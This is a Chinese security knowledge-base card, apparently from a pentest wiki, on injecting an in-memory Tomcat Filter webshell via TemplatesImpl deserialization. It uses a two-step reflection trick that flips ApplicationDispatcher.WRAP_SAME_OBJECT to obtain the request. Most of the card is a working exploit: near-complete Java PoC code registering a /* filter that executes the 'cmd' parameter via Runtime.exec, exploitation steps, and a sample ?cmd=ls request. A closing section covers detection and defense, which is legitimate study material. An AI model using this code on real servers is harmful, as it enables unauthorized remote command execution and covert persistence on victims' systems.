---
id: web-java-deserialization-templatesimpl-lastservicedrequest-filter-memshell
title: 反序列化 TemplatesImpl 静态块经 ApplicationFilterChain.lastServicedRequest 获取 request，注入 Tomcat Filter 内存马（翻转 WRAP_SAME_OBJECT，两步触发）
type: scenario
domain: web
path: web/java/deserialization
technique: templatesimpl-lastservicedrequest-tomcat-filter-memshell
tags:
- java
- tomcat
- deserialization
- templatesimpl
- memshell
- filter
- lastservicedrequest
- standardcontext
- reflection
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V697
  verified_at: '2026-11-13T18:30:06+08:00'
  notes: 已对照原文全文与 8 图核对：img01-06 为 Tomcat 容器/Pipeline/Valve 结构与 StandardWrapperValve→StandardContextValve→CoyoteAdapter→Http11Processor→NioEndpoint 调用栈；img07 流程图确认 CC11 把 FilterShell 写入 TemplatesImpl 字节码、序列化 ccFilter.ser、/inject readObject 触发 defineTransletClasses/newTransformer 执行静态块注入 Filter；img08 localhost:8081/memory_uses_war_exploded/?cmd=ls 回显 Tomcat bin 目录端到端成功。卡内机制与原文代码逐条一致：ApplicationDispatcher.WRAP_SAME_OBJECT（static final boolean，默认 false）在 ApplicationFilterChain.doFilter 开头为 true 才写 lastServicedRequest/Response 两个 static final ThreadLocal；静态块 setFinalStatic 去 final 后翻转开关并重置 ThreadLocal（第 1 次触发只初始化），第 2 次请求经滤链写入后 static 块读 request→getServletContext→ApplicationContext.context→StandardContext，经 FilterDef/addFilterDef/filterConfigs+ApplicationFilterConfig 构造/addFilterMapBefore 注册 /* Filter，doFilter 执行 cmd。原文 Tomcat9.0.55+JDK8u66 环境，JDK12+ modifiers 反射限制卡内已注明边界。dedup 全部为 related 无 duplicate：shiro 静态块卡走 WebappClassLoaderBase#getResources().getContext() 单请求注入、spring translet 卡走 RequestContextHolder+registerMapping，本卡
    lastServicedRequest/WRAP_SAME_OBJECT 两步机制与 PoC 均不同，dedup_review 边界成立；dup-scan.json 无 involving pair。原文未给组件受影响区间（仅明确 Tomcat 10.x 尝试失败），未设 affected_versions。未验证点：PoC 未本机复跑；'Tomcat 8/9 均存在同类逻辑'为通行判断，原文仅实测 9.0.55。
url: /docs/web/java/deserialization/web-java-deserialization-templatesimpl-lastservicedrequest-filter-memshell/
draft: false
kb_aliases:
- lastServicedRequest 内存马
- WRAP_SAME_OBJECT 内存马
- TemplatesImpl FilterShell
- AbstractTranslet 注入 Filter
- 反序列化内存马获取 request
- 两步注入内存马
---

## 一句话结论

反序列化触发点里没有 `HttpServletRequest`，但 Tomcat 的 `ApplicationFilterChain` 用静态 `ThreadLocal`（`lastServicedRequest`/`lastServicedResponse`）暂存最近一次请求，只有在 `ApplicationDispatcher.WRAP_SAME_OBJECT` 为 true 时才写入；让继承 `AbstractTranslet` 的恶意类在静态块里用反射把 `WRAP_SAME_OBJECT` 置 true、重置两个 ThreadLocal（第一次触发只做初始化），后续请求经滤链写入 ThreadLocal 后再触发反序列化，静态块即可从 `lastServicedRequest.get()` 取到 request → `ServletContext` → `ApplicationContext.context` → `StandardContext`，进而用 `FilterDef`/`ApplicationFilterConfig`/`FilterMap` 注册恶意 Filter 内存马并执行 `cmd`（本文用 CC11 + TemplatesImpl 投递，Tomcat 9.0.55/JDK8u66 实测 `?cmd=ls` 回显）。

## 原理

- **无 request 的困境**：TemplatesImpl 反序列化链在 `newTransformer()` → `defineTransletClasses()` → `newInstance()` 时执行 translet 静态块，此时攻击者只有 JVM 内代码执行，没有当前请求对象；而注入 Tomcat Filter 内存马需要 `StandardContext`（`addFilterDef`/`filterConfigs`/`addFilterMapBefore`）。
- **Tomcat 的请求暂存机制**：`ApplicationFilterChain.doFilter` 在开头做：
  ```java
  if (ApplicationDispatcher.WRAP_SAME_OBJECT) {
      lastServicedRequest.set(request);
      lastServicedResponse.set(response);
  }
  ```
  其中 `ApplicationDispatcher.WRAP_SAME_OBJECT` 是 `static final boolean`，默认 false（静态初始化时由系统属性决定），`lastServicedRequest/Response` 是 `static final ThreadLocal<ServletRequest/ServletResponse>`。默认情况下它们为空，应用代码拿不到最近请求。
- **反射翻转开关**：恶意 translet 静态块反射取到这三个 `static final` 字段，用 `Field.class.getDeclaredField("modifiers")` 去掉 `final` 修饰（JDK8 可行），然后把 `WRAP_SAME_OBJECT` 设为 true、把两个 ThreadLocal 字段替换为新的 `ThreadLocal()`，使后续请求的 `doFilter` 开始写入当前请求。这一步是“第一次触发初始化”。
- **第二次触发取 request**：之后再次访问反序列化入口时，本次请求在进入 servlet 前已经过 Filter 链，`lastServicedRequest.get()` 即当前请求；静态块在 else 分支读出 request/response，经 `request.getServletContext()` → 反射 `ApplicationContext.context` → `StandardContext` 拿到应用上下文。
- **注册恶意 Filter**：构造 `FilterDef`（filter 实例=translet 自身、filterName、filterClass），`standardContext.addFilterDef(filterDef)`；反射 `StandardContext.filterConfigs` 这个 Map，用私有构造 `ApplicationFilterConfig(Context, FilterDef)` 创建配置并 `put` 进去；再构造 `FilterMap`（`/*`），调用 `addFilterMapBefore` 插到最前。translet 同时实现 `Filter.doFilter`，读 `cmd` 参数 `Runtime.exec` 并写回响应，于是所有请求都经过后门。
- **为什么必须两步/或预置开关**：如果首次触发时 `WRAP_SAME_OBJECT` 还是 false，`doFilter` 根本没写 ThreadLocal，静态块只能先改开关；下一次请求才会写入。若目标应用/框架此前已把该开关置 true（或已有代码初始化过 ThreadLocal），则可一步完成。
- **投递方式**：用 CommonsCollections 等链把 `FilterShell`（extends `AbstractTranslet` implements `Filter`）的字节码写入 `TemplatesImpl._bytecodes`，序列化后由 `/inject` 之类反序列化入口触发；整个过程无文件落地，JVM 重启后失效。

## 触发条件

- 目标存在可控反序列化入口（本文 `/inject` 直接 `readObject`；实战可为 CC/Shiro/fastjson 等链的 TemplatesImpl 触发）。
- 运行 Tomcat（本文 9.0.55，同类逻辑在 Tomcat 8/9 均存在），JDK8 等允许反射修改 `Field.modifiers` 的环境（JDK12+ 需 Unsafe 等替代手段）。
- 攻击者能把实现 `AbstractTranslet`（+ Filter）的恶意类字节码嵌入 TemplatesImpl 并构造触发链。
- 可多次访问反序列化入口（两步注入）或目标 `WRAP_SAME_OBJECT` 已为 true。

## 利用步骤

1. 编写恶意类 `FilterShell extends AbstractTranslet implements Filter`：静态块完成“翻转 WRAP_SAME_OBJECT/初始化 ThreadLocal→取 request→取 StandardContext→注册 Filter”的逻辑；`doFilter` 执行 `cmd`。
2. 第一次访问 `/inject` 触发反序列化：静态块检测到 `WRAP_SAME_OBJECT=false`/ThreadLocal 为空，只做开关翻转与 ThreadLocal 初始化。
3. 第二次访问 `/inject`：请求经 Filter 链时 `doFilter` 已把当前 request/response 写入 ThreadLocal；静态块在 else 分支读取它们，反射到 `StandardContext` 并注册 Filter，响应出现 `Inject Success!`。
4. 访问任意路径 `?cmd=ls`，注入的 Filter 执行命令并回显（本文截图回显 Tomcat bin 目录）。
5. 后续可用冰蝎/哥斯拉等客户端连接该 Filter 内存马，或直接以 `cmd` 参数维持命令执行。

## PoC

```java
public class FilterShell extends AbstractTranslet implements Filter {
    static {
        try {
            Field WRAP_SAME_OBJECT = Class.forName("org.apache.catalina.core.ApplicationDispatcher")
                    .getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequest = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
            Field lastServicedResponse = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");
            setFinalStatic(WRAP_SAME_OBJECT);
            setFinalStatic(lastServicedRequest);
            setFinalStatic(lastServicedResponse);
            ThreadLocal<ServletRequest> reqTl = (ThreadLocal<ServletRequest>) lastServicedRequest.get(null);
            ThreadLocal<ServletResponse> respTl = (ThreadLocal<ServletResponse>) lastServicedResponse.get(null);
            if (!WRAP_SAME_OBJECT.getBoolean(null) || reqTl == null || respTl == null) {
                WRAP_SAME_OBJECT.setBoolean(null, true);      // 第一次触发：只初始化
                lastServicedRequest.set(null, new ThreadLocal());
                lastServicedResponse.set(null, new ThreadLocal());
            } else {
                ServletRequest req = reqTl.get();             // 第二次触发：拿到当前请求
                ServletContext sc = req.getServletContext();
                Field ctx = sc.getClass().getDeclaredField("context"); ctx.setAccessible(true);
                ApplicationContext ac = (ApplicationContext) ctx.get(sc);
                Field ctx1 = ac.getClass().getDeclaredField("context"); ctx1.setAccessible(true);
                StandardContext standardContext = (StandardContext) ctx1.get(ac);

                FilterDef def = new FilterDef();
                def.setFilter(new FilterShell());
                def.setFilterName("Sentiment");
                def.setFilterClass(FilterShell.class.getName());
                standardContext.addFilterDef(def);

                Field configs = StandardContext.class.getDeclaredField("filterConfigs");
                configs.setAccessible(true);
                Map map = (Map) configs.get(standardContext);
                Constructor<ApplicationFilterConfig> c = ApplicationFilterConfig.class
                        .getDeclaredConstructor(Context.class, FilterDef.class);
                c.setAccessible(true);
                map.put("Sentiment", c.newInstance(standardContext, def));

                FilterMap fm = new FilterMap();
                fm.addURLPattern("/*");
                fm.setFilterName("Sentiment");
                standardContext.addFilterMapBefore(fm);
                respTl.get().getWriter().write("Inject Success !");
            }
        } catch (Exception e) { e.printStackTrace(); }
    }
    // doFilter：读 cmd 参数并 Runtime.exec，将输出写回 response
}
```

```text
# 注入后访问
GET /memory_uses_war_exploded/?cmd=ls
# 响应回显 tomcat bin 目录（bootstrap.jar、catalina.sh、startup.sh ...），证明 Filter 内存马生效
```

## 变体与关联

- 变体：JNDI 注入场景在构造器里已有 TCCL，可直接 `Thread.currentThread().getContextClassLoader()` 获取 `StandardContext`，无需 lastServicedRequest（[[web-java-deserialization-jndi-tomcat-filter-memshell]]）。
- 变体：fastjson/c3p0 投递 TemplatesImpl 字节码的入口与 WAF 绕过（[[web-java-deser-fastjson-1247-c3p0-templatesimpl-memshell]]）。
- 关联：直接可执行 Java 代码时用 `StandardContext.addFilterDef/addFilterMapBefore/filterStart` 注册 Filter（[[web-java-component-tomcat-dynamic-filter-memshell]]）；Listener/Servlet/Valve 内存马见 [[web-java-component-tomcat-listener-memshell]]、[[web-java-component-tomcat-standardcontext-servlet-memshell]]、[[web-java-component-tomcat-valve-memshell]]；Agent 注入路线见 [[web-java-classloader-deser-attach-agent-filterchain-memshell]]。
- 边界：JDK12+ 无法直接改 `Field.modifiers`（需 Unsafe 或其它写 static final 的方法）；Tomcat 版本改动字段名/实现会失败；应用若从未触发 Filter 链或已禁用 Filter，取不到请求；JVM 重启内存马消失。

## 检测与防御

- 检测：运行时 `ApplicationDispatcher.WRAP_SAME_OBJECT` 被改为 true、`ApplicationFilterChain.lastServicedRequest/Response` 被替换（非原实例）；`StandardContext.filterDefs`/`filterConfigs`/`filterMaps` 出现新增项且无对应 web.xml；高权限 JFR/arthas 观察 Filter 类来源为 TemplatesImpl 生成的 translet。
- 防御：升级 JDK 并限制反射修改 static final；对反序列化入口做白名单/类过滤（TemplatesImpl 黑名单）；Tomcat 关注 Filter 链完整性；使用 RASP 检测运行时 Filter 注册与 translet 类。
- 加固：消除反序列化入口与 TemplatesImpl 可用链；限制 `javax.management`/JNDI 等；对内存马做定期扫描（[[defense-detection-tomcat-memshell-scanner-arthas]]、[[defense-detection-memshell-reflection-remove-listener-controller-interceptor]]）。
